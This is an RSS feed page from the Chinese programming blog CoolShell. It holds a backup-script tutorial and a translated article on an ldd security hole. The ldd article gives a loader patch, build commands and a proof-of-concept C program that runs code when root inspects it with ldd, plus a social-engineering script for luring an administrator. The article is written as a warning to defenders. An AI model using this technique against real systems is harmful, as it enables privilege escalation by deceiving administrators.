@@ -1,0 +1,2840 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>第 36 页 &#8211; 酷 壳 &#8211; CoolShell</title>
+	<atom:link href="https://coolshell.cn/feed?paged=36" rel="self" type="application/rss+xml" />
+	<link>https://coolshell.cn</link>
+	<description>享受编程和技术所带来的快乐 - Coding Your Ambition</description>
+	<lastBuildDate>Mon, 28 Dec 2020 08:22:50 +0000</lastBuildDate>
+	<language>zh-CN</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.2</generator>
+	<item>
+		<title>文件备份的几个简单命令</title>
+		<link>https://coolshell.cn/articles/1640.html</link>
+					<comments>https://coolshell.cn/articles/1640.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Fri, 30 Oct 2009 07:16:20 +0000</pubDate>
+				<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[backup]]></category>
+		<category><![CDATA[ftp]]></category>
+		<category><![CDATA[tar]]></category>
+		<category><![CDATA[wget]]></category>
+		<category><![CDATA[zip]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1640</guid>
+
+					<description><![CDATA[<p>我们知道，备份文件是一件很重要的事情，我在《优秀程序员的十个习惯》一文向大家说明了备份文件应该是程序员最基本的一个习惯。本文主要是向大家介绍一些在备份文件和数据...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1640.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1640.html">文件备份的几个简单命令</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>我们知道，备份文件是一件很重要的事情，我在《<a rel="bookmark" href="https://coolshell.cn/articles/222.html">优秀程序员的十个习惯</a>》一文向大家说明了备份文件应该是程序员最基本的一个习惯。本文主要是向大家介绍一些在备份文件和数据时能用得到的一些示例，当然，这些示例主要是通过一些命令行或是脚本来实现的。这就是用命令行和脚本的优势，你可以实现比较灵活和自动的定制。</p>
+<p>本文中的脚本和示例都是主要是通过zip, tar, ftp, wget和shell脚本来完成。在Linux下，你可以什么也不用安装任何程序，但在Windows下，你需要安装zip 和wget这三个命令（在本文的最后有这三个命令的链接，你可以去下载）</p>
+<h4>几个小脚本</h4>
+<p><strong>1）首先，我们来看一下，如何给某目录打个zip包。</strong></p>
+<p><strong>Windows</strong>:</p>
+<p><code data-enlighter-language="shell" class="EnlighterJSRAW"> zip -r backup.zip &quot;c:\yourfolder&quot;</code></p>
+<p><strong>Linux</strong>: (打包自己的home目录)</p>
+<p><code data-enlighter-language="shell" class="EnlighterJSRAW">tar -czvf ~/backup.tgz --exclude backup.tgz ~/</code></p>
+<p><span id="more-1640"></span><br />
+<strong>2）接下来，我们再来看一下，创建一个带有时间文件名的压缩包，并上传到远程主机的一个例子。</strong></p>
+<p> <strong>Windows</strong></p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">
+  :: cmd 脚本
+  :: 压缩包文件格式`backup-mm-dd-yyyy.zip&#039;
+  :: 注意：%dir% 被引号括起是怕目录名中有空格
+
+  @echo off
+
+  set host=ftp.yourhost.com
+  set user=username
+  set pass=password
+  set file=backup-%date:~4,2%-%date:~7,2%-%date:~10%.zip
+  set dir=&quot;yourfolder&quot;
+
+  zip -r %file% %dir%
+
+  &gt;  script.ftp echo open %host%
+  &gt;&gt; script.ftp echo %user%
+  &gt;&gt; script.ftp echo %pass%
+  &gt;&gt; script.ftp echo bin
+  &gt;&gt; script.ftp echo put %file%
+  &gt;&gt; script.ftp echo bye
+
+  ftp.exe -d -s:script.ftp &gt; backup.log
+
+  del script.ftp
+</pre>
+<p><strong>Linux</strong></p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">
+  #!/bin/bash
+
+  host=&quot;ftp.yoursite.com&quot;
+  user=&quot;username&quot;
+  pass=&quot;password&quot;
+  file=&quot;backup-$(date &#039;+%m-%d-%Y&#039;).tgz&quot;
+  dir=&quot;$HOME&quot;
+
+  tar -cvzf $file $dir
+
+  ftp -vin &lt;ftp.log
+  open $host
+  user $user $pass
+  bin
+  put $file
+  close
+  bye
+  EOF
+</pre>
+<p><strong>3）最后，我们来看一看，通过wget命令来下载备份好的压缩包。</strong></p>
+<p><strong>Windows</strong></p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">
+  :: cmd 脚本
+  :: 注意： &#039;^&#039; 是一个命令的换行符
+
+  set host=&quot;ftp://ftp.your.host.com&quot;
+  set user=&quot;flintstone&quot;
+  set pass=&quot;yabbadabbadoo&quot;
+
+  wget %host% --ftp-user=%user% --ftp-password=%pass% ^ 
+      --mirror --output-file=backup.log --passive-ftp
+</pre>
+<p><strong>Linux</strong></p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">
+  #!/bin/sh
+  # 注意 &#039;\&#039; 是命令的换行符
+  
+  host=&quot;ftp://ftp.your.host.com&quot;
+  user=&quot;username&quot;
+  pass=&quot;password&quot;
+
+  wget $host --ftp-user=$user --ftp-password=$pass \
+  --mirror --output-file=backup.log --passive-ftp
+</pre>
+<h4>相关工具</h4>
+<ul>
+<li>Info-Zip: <a href="http://www.info-zip.org/">http://www.info-zip.org/</a></li>
+<li>GNU Tar: <a href="http://www.gnu.org/software/tar/">http://www.gnu.org/software/tar/</a></li>
+<li>GNU Wget: <a href="http://www.gnu.org/software/wget/">http://www.gnu.org/software/wget/</a></li>
+</ul>
+<h4>几点注意</h4>
+<p>上面的那几个命令比较简单，只是表明一些备份的脚本思路。在实际过程当中，基本上也是这样，下面是几点注意。</p>
+<p>1）给备份文件打包压缩这是第一步，你可以选用其它的压缩程序。如bzip。<br />
+2）文件名上有时间信息比较容易归档。有时候，文件包比较大，还需要对大文件进行分割（一般的压缩软件都支持文件分割）。<br />
+3）使用wget和ftp可能会有用户名密码泄露的问题，使用ssh拷贝文件会比较好。<br />
+4）源代码最好还是使用版本控制工具备份（比如Subversion或CVS）<br />
+5）备份脚本可以放在计划任务（linux是corn）中以实际自动化。<br />
+6）以上的方法一般说来比较适用于全部备份，而不是增量备份。</p>
+<p>（全文完）<a href="http://topcat.hypermart.net/backup.html" target="_blank"></a><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/3136.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/3.jpg" alt="chmod -x chmod的N种解法" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3136.html" class="wp_rp_title">chmod -x chmod的N种解法</a></li><li ><a href="https://coolshell.cn/articles/7617.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/06/i-hate-copycat-150x150.png" alt="抄袭，腾讯 和 产品 " width="150" height="150" /></a><a href="https://coolshell.cn/articles/7617.html" class="wp_rp_title">抄袭，腾讯 和 产品 </a></li><li ><a href="https://coolshell.cn/articles/3540.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/25.jpg" alt="一段Javascript的代码" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3540.html" class="wp_rp_title">一段Javascript的代码</a></li><li ><a href="https://coolshell.cn/articles/1901.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/12/viemu-movie-150x150.gif" alt="Visual Studio的Vim插件" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1901.html" class="wp_rp_title">Visual Studio的Vim插件</a></li><li ><a href="https://coolshell.cn/articles/179.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/03/windows_7_created_in_future2-300x179-1-150x150.jpg" alt="OMG, Windows 7 来自未来" width="150" height="150" /></a><a href="https://coolshell.cn/articles/179.html" class="wp_rp_title">OMG, Windows 7 来自未来</a></li><li ><a href="https://coolshell.cn/articles/2529.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/6.jpg" alt="StackOverflow的404错误页" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2529.html" class="wp_rp_title">StackOverflow的404错误页</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1640.html">文件备份的几个简单命令</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1640.html/feed</wfw:commentRss>
+			<slash:comments>6</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>ldd 的一个安全问题</title>
+		<link>https://coolshell.cn/articles/1626.html</link>
+					<comments>https://coolshell.cn/articles/1626.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 27 Oct 2009 16:15:46 +0000</pubDate>
+				<category><![CDATA[Unix/Linux]]></category>
+		<category><![CDATA[编程工具]]></category>
+		<category><![CDATA[网络安全]]></category>
+		<category><![CDATA[ldd]]></category>
+		<category><![CDATA[Linux]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1626</guid>
+
+					<description><![CDATA[<p>我们知道“ldd”这个命令主要是被程序员或是管理员用来查看可执行文件所依赖的动态链接库的。是的，这就是这个命令的用处。可是，这个命令比你想像的要危险得多，也许很...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1626.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1626.html">ldd 的一个安全问题</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>我们知道“ldd”这个命令主要是被程序员或是管理员用来查看可执行文件所依赖的动态链接库的。是的，这就是这个命令的用处。可是，这个命令比你想像的要危险得多，也许很多黑客通过ldd的安全问题来攻击你的服务器。其实，ldd的安全问题存在很长的时间了，但居然没有被官方文档所记录来下，这听上去更加难以理解了。怎么？是不是听起来有点不可思议？下面，让我为你细细道来。</p>
+<p>首先，我们先来了解一下，我们怎么来使用ldd的，请你看一下下面的几个命令：</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">(1) $ ldd /bin/grep
+        linux-gate.so.1 =&gt;  (0xffffe000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0xb7eca000)
+        /lib/ld-linux.so.2 (0xb801e000)
+
+(2) $ LD_TRACE_LOADED_OBJECTS=1 /bin/grep
+        linux-gate.so.1 =&gt;  (0xffffe000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0xb7e30000)
+        /lib/ld-linux.so.2 (0xb7f84000)
+
+(3) $ LD_TRACE_LOADED_OBJECTS=1 /lib/ld-linux.so.2 /bin/grep
+        linux-gate.so.1 =&gt;  (0xffffe000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0xb7f7c000)
+        /lib/ld-linux.so.2 (0xb80d0000)</pre>
+<p>第(1)个命令，我们运行了 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 于 <code data-enlighter-language="raw" class="EnlighterJSRAW">/bin/grep</code>。我们可以看到命令的输出是我们想要的，那就是 <code data-enlighter-language="raw" class="EnlighterJSRAW">/bin/grep</code> 所依赖的动态链接库。</p>
+<p>第(2)个命令设置了一个叫 LD_TRACE_LOADED_OBJECTS 的环境变量，然后就好像在运行命令 <code data-enlighter-language="raw" class="EnlighterJSRAW">/bin/grep</code> (但其实并不是)。 其运行结果和ldd的输出是一样的！</p>
+<p>第(3)个命令也是设置了环境变量 LD_TRACE_LOADED_OBJECTS ，然后调用了动态链接库 <code data-enlighter-language="raw" class="EnlighterJSRAW">ld-linux.so</code> 并把 <code data-enlighter-language="raw" class="EnlighterJSRAW">/bin/grep</code> 作为参数传给它。我们发现，其输出结果还是和前面两个一样的。</p>
+<p><span id="more-1626"></span></p>
+<h4>具体发生了什么？</h4>
+<p>对于第二个和第三个命令来说，好像是对 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 的一个包装或是一个隐式调用。对于第二个和第三个命令来说， <code data-enlighter-language="raw" class="EnlighterJSRAW">/bin/grep</code> 这个命令就根本没有被运行。这是一个GNU动态载入器的怪异的特性。如果其注意到环境变量LD_TRACE_LOADED_OBJECTS 被设置了，那么它就不会去执行那个可运行的程序，而去输出这个可执行程序所依赖的动态链接库 （在BSD 系统上的<code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 是一个C 程序)。</p>
+<p>如果你使用的是Linux，那么，你可以去看看 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 程序，你会发现这是一个 bash 的脚本。如果你仔细查看这个脚本的源码，你会发现，第二个命令和第三个命令的差别就在于 <code data-enlighter-language="raw" class="EnlighterJSRAW">ld-linux.so</code> 装载器是否可以被<code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code>所装载，如果不能，那就是第二个命令，如果而的话，那就是第三个命令。</p>
+<p>所以，如果我们可以让<code data-enlighter-language="raw" class="EnlighterJSRAW">ld-linux.so</code> 装载器失效的话，或是让别的装载器来取代这个系统默认的动态链接库的话，那么我们就可以让 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code>来载入并运行我们想要程序了——使用不同的载装器并且不处理LD_TRACE_LOADED_OBJECTS 环境变量，而是直接运行程序。</p>
+<p>例如，你可以创建一个具有恶意的程序，如： ~/app/bin/exec 并且使用他自己的装载器 ~/app/lib/loader.so。如果某人（比如超级用户root） 运行了 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd /home/you/app/bin/exec</code> ，于是，他就玩完了。因为，那并不会列出所依赖的动态链接库，而是，直接执行你的那个恶意程序，这相当于，那个用户给了你他的授权。</p>
+<h4>编译一个新的装载器</h4>
+<p>下载 <a href="http://www.uclibc.org/">uClibc</a> C库。这是一个相当漂亮的代码，并且可以非常容易地修改一下源代码，使其忽略LD_TRACE_LOADED_OBJECTS 检查。</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ mkdir app
+$ cd app
+app$ wget &#039;http://www.uclibc.org/downloads/uClibc-0.9.30.1.tar.bz2&#039;</pre>
+<p>解压这个包，并执行 <code data-enlighter-language="raw" class="EnlighterJSRAW">make menuconfig</code>，选项你的平台架构（比如：i386），剩下的事情保持不变。</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ bunzip2 &lt; uClibc-0.9.30.1.tar.bz2 | tar -vx
+$ rm -rf uClibc-0.9.30.1.tar.bz2
+$ cd uClibc-0.9.30.1
+$ make menuconfig</pre>
+<p>编辑 .config 并设置目标安装目录：到 <code data-enlighter-language="raw" class="EnlighterJSRAW">/home/you/app/uclibc</code>，<br />
+把下面两行</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">
+RUNTIME_PREFIX=&quot;/usr/$(TARGET_ARCH)-linux-uclibc/&quot;
+DEVEL_PREFIX=&quot;/usr/$(TARGET_ARCH)-linux-uclibc/usr/&quot;</pre>
+<p>改成</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">RUNTIME_PREFIX=&quot;/home/you/app/uclibc/&quot;
+DEVEL_PREFIX=&quot;/home/you/app/uclibc/usr/&quot;</pre>
+<p>现在你需要改动一下其源代码，让其忽略LD_TRACE_LOADED_OBJECTS 环境变量的检查。 下面是个这修改的diff，你需要修改的是 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldso/ldso/ldso.c</code> 文件。你可把下面的这个diff存成一个叫file的文件，然后运行这个命令：<code data-enlighter-language="raw" class="EnlighterJSRAW">patch -p0 &lt; file</code>。如果你不这样做的话，那么，我们的黑客程序就无法工作，而我们的这个装载器还是会认为 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 想列出动态链接库的文件列表。</p>
+<p>[patch]<br />
+&#8212; ldso/ldso/ldso-orig.c       2009-10-25 00:27:12.000000000 +0300<br />
++++ ldso/ldso/ldso.c    2009-10-25 00:27:22.000000000 +0300<br />
+@@ -404,9 +404,11 @@<br />
+         }  #endif<br />
++    /*<br />
+         if (_dl_getenv(&quot;LD_TRACE_LOADED_OBJECTS&quot;, envp) != NULL) {<br />
+                 trace_loaded_objects++;<br />
+         }<br />
++    */<br />
+   #ifndef __LDSO_LDD_SUPPORT__<br />
+         if (trace_loaded_objects) {<br />
+[/patch]</p>
+<p>下面让我们来编译并安装它。</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ make -j 4
+$ make install</pre>
+<p>于是，我们的 uClibc 装载器就被安装了，并且libc 库指向了 /home/you/app/uclibc. 就这么简单，现在，我们需要做的就是把我们的uClibc的装载器 (app/lib/ld-uClibc.so.0)变成默认的。</p>
+<h4>小试 牛刀</h4>
+<p>首先，先让我们来创建一个测试程序，这人程序也就是输出些自己的东西，这样可以让我们看到我们的程序被执行了。我们把这个程序放在 <code data-enlighter-language="raw" class="EnlighterJSRAW">app/bin/</code>下，叫“myapp.c”，下面是源代码</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+  if (getenv(&quot;LD_TRACE_LOADED_OBJECTS&quot;)) {
+    printf(&quot;All your things are belong to me.\n&quot;);
+  }
+  else {
+    printf(&quot;Nothing.\n&quot;);
+  }
+  return 0;
+}</pre>
+<p>这是一个很简单的代码了，这段代码主要检查一下环境变量LD_TRACE_LOADED_OBJECTS 是否被设置了，如果是，那么恶意程序执行，如果没有，那么程序什么也不发生。</p>
+<p>下面是编译程序的命令，，大家可以看到，我们静态链接了一些函数库。我们并不想让LD_LIBRARY_PATH这个变量来发挥作用。</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ L=/home/you/app/uclibc
+$ gcc -Wl,--dynamic-linker,$L/lib/ld-uClibc.so.0 \
+    -Wl,-rpath-link,$L/lib \
+    -nostdlib \
+    myapp.c -o myapp \
+    $L/usr/lib/crt*.o \
+    -L$L/usr/lib/ \
+    -lc</pre>
+<p>下面是GCC的各个参数的解释：</p>
+<ul>
+<li><strong>-Wl,&#8211;dynamic-linker,$L/lib/ld-uClibc.so.0</strong> — 指定一个新的装载器。</li>
+<li><strong>-Wl,-rpath-link,$L/lib</strong> — 指定一个首要的动态装载器所在的目录，这个目录用于查找动态库。</li>
+<li><strong>-nostdlib</strong> — 不使用系统标准库。</li>
+<li><strong>myapp.c -o myapp</strong> — 编译myapp.c 成可执行文件 myapp,</li>
+<li><strong>$L/usr/lib/crt*.o</strong> — 静态链接runtime 代码</li>
+<li><strong>-L$L/usr/lib/</strong> — libc 的目录（静态链接）</li>
+<li><strong>-lc</strong> —  C 库</li>
+</ul>
+<p>现在让我们来运行一下我们的 <code data-enlighter-language="raw" class="EnlighterJSRAW">myapp</code> （没有ldd，一切正常）</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">app/bin$ ./myapp
+Nothing.</pre>
+<p>LD_TRACE_LOADED_OBJECTS 没有设置，所以输出 “Nothing” 。</p>
+<p>现在，让我们来使用 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 来看看这个程序的最大的影响力，让我们以root身份来干这个事。</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ su
+Password:
+# ldd ./myapp
+All your things are belong to me.</pre>
+<p>哈哈，我们可以看到，ldd触发了我们的恶意代码。于是，我们偷了整个系统！</p>
+<h4>邪恶的程序</h4>
+<p>下面这个例子更为实际一些，如果没有<code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> ，那程序程序会报错 “error while loading shared libraries” ，这个错误信息会引诱你去去使用 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 去做检查，如果你是root的话，那么就整个系统就玩完了。而当你可以了 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 后，它会在干完坏事后，模仿正确的<code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code>的输出，告诉你 <code data-enlighter-language="raw" class="EnlighterJSRAW">libat.so.0</code> 不存在。</p>
+<p>下面的代码仅仅是向你展示了一下整个想法，代码还需加工和改善。</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+/*
+This example pretends to have a fictitious library &#039;libat.so.0&#039; missing.
+When someone with root permissions runs `ldd this_program`, it does
+something nasty in malicious() function.
+
+I haven&#039;t implemented anything malicious but have written down some ideas
+of what could be done.
+
+This is, of course, a joke program. To make it look more real, you&#039;d have
+to bump its size, add some more dependencies, simulate trying to open the
+missing library, detect if ran under debugger or strace and do absolutely
+nothing suspicious, etc.
+*/
+
+void pretend_as_ldd()
+{
+    printf(&quot;\tlinux-gate.so.1 =&gt;  (0xffffe000)\n&quot;);
+    printf(&quot;\tlibat.so.0 =&gt; not found\n&quot;);
+    printf(&quot;\tlibc.so.6 =&gt; /lib/libc.so.6 (0xb7ec3000)\n&quot;);
+    printf(&quot;\t/lib/ld-linux.so.2 (0xb8017000)\n&quot;);
+}
+
+void malicious()
+{
+    if (geteuid() == 0) {
+        /* we are root ... */
+        printf(&quot;poof, all your box are belong to us\n&quot;);
+
+        /* silently add a new user to /etc/passwd, */
+        /* or create a suid=0 program that you can later execute, */
+        /* or do something really nasty */
+    }
+}
+
+int main(int argc, char **argv)
+{
+    if (getenv(&quot;LD_TRACE_LOADED_OBJECTS&quot;)) {
+        malicious();
+        pretend_as_ldd();
+        return 0;
+    }
+
+    printf(&quot;%s: error while loading shared libraries: libat.so.0: &quot;
+           &quot;cannot open shared object file: No such file or directory\n&quot;,
+           argv[0]);
+    return 127;
+}</pre>
+<p> </p>
+<h4>邪恶的电话</h4>
+<p>事实上来说，上面的那段程序可能的影响更具破坏性，因为大多数的系统管理员可能并不知道不能使用 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 去测试那些不熟悉的执行文件。下面是一段很可能会发现的对话，让我们看看我们的程序是如何更快地获得系统管理员的权限的。</p>
+<p>系统管理员的电话狂响……</p>
+<p>系统管理员： “同志你好，我是系统管理员，有什么可以帮你的？”</p>
+<p>黑客：“管理员同志你好。我有一个程序不能运行，总是报错，错误好像是说一个系统动态链接库有问题，你能不能帮我看看？”</p>
+<p>系统管理员：“没问题，你的那个程序在哪里？”</p>
+<p>黑客： “在我的home目录下，/home/hchen/app/bin/myapp”。</p>
+<p>系统管理员：“ OK，等一会儿”，黑客在电话这头可以听到一些键盘的敲击声。</p>
+<p>系统管理员：“好像是动态链接库的问题，你能告诉我你的程序具体需要什么样的动态链接库吗？”</p>
+<p>黑客说: “谢谢，应该没有别的嘛。”</p>
+<p>系统管理员：“嗯，查到了，说是没有了 <code data-enlighter-language="raw" class="EnlighterJSRAW">libat.so.0</code>这是你自己的动态链接库吗？”</p>
+<p>黑客说：“哦，好像是的，你等一下，我看看……” 黑客在那头露出了邪恶的笑，并且，讯速地输入了下面的命令：</p>
+<p style="padding-left: 30px;"><code data-enlighter-language="raw" class="EnlighterJSRAW">mv ~/.hidden/working_app ~/app/bin/myapp</code><br />
+<code data-enlighter-language="raw" class="EnlighterJSRAW">mv ~/.hidden/libat.so.o ~/app/bin/</code></p>
+<p>黑客说：“哦，对了，的确是我的不对，我忘了把这个链接库拷过来了，现在应该可以了，谢谢你啊，真是不好意思，麻烦你了”</p>
+<p>系统管理员： “没事就行了，下次注意啊！”（然后系统管理心里暗骂，TMD，又一个白痴用户！……）</p>
+<p><strong>教训一：千万不要使用 <code data-enlighter-language="raw" class="EnlighterJSRAW">ldd</code> 去测试你不知道的文件！<br />
+教训二：千万不要相信陌生人！</strong></p>
+<p>文章：<a href="http://www.catonmat.net/blog/ldd-arbitrary-code-execution/" target="_blank">来源</a>（以上文章并非完全翻译，我做过一些修改，所以，如果你要转载，请注明作者和出处）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/22320.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/12/eBPF-150x150.jpeg" alt="eBPF 介绍" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22320.html" class="wp_rp_title">eBPF 介绍</a></li><li ><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/03/linux.ninja_-150x150.png" alt="打造高效的工作环境 &#8211; Shell 篇" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_title">打造高效的工作环境 &#8211; Shell 篇</a></li><li ><a href="https://coolshell.cn/articles/18654.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/12/docker-networking-1-150x150.png" alt="记一次Kubernetes/Docker网络排障" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18654.html" class="wp_rp_title">记一次Kubernetes/Docker网络排障</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/systemd-1-150x150.jpeg" alt="Linux PID 1 和 Systemd" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_title">Linux PID 1 和 Systemd</a></li><li ><a href="https://coolshell.cn/articles/17416.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2016/07/cache-150x150.png" alt="缓存更新的套路" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17416.html" class="wp_rp_title">缓存更新的套路</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1626.html">ldd 的一个安全问题</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1626.html/feed</wfw:commentRss>
+			<slash:comments>41</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Windows 7 的新粉丝 Linus Torvalds</title>
+		<link>https://coolshell.cn/articles/1619.html</link>
+					<comments>https://coolshell.cn/articles/1619.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Fri, 23 Oct 2009 06:21:50 +0000</pubDate>
+				<category><![CDATA[Windows]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[Linus Torvalds]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1619</guid>
+
+					<description><![CDATA[<p>正当Windows 7 开始热卖的时候，正当广大北美用户抱怨Windows 7的销售价格，在东方要比西方便宜很多的时候。我们著名的Linus Torvalds来...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1619.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1619.html">Windows 7 的新粉丝 Linus Torvalds</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
